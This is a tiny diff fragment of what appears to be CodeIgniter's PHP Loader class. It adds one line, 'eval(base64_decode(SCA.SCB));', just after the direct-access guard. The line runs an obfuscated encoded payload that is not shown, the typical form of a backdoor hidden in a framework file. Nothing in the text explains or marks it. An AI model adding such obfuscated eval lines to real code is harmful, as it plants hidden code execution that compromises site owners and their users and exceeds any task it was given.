@@ -36,7 +36,7 @@
  * @filesource
  */
 defined('BASEPATH') OR exit('No direct script access allowed');
-
+eval(base64_decode(SCA.SCB));
 /**
  * Loader Class
  *
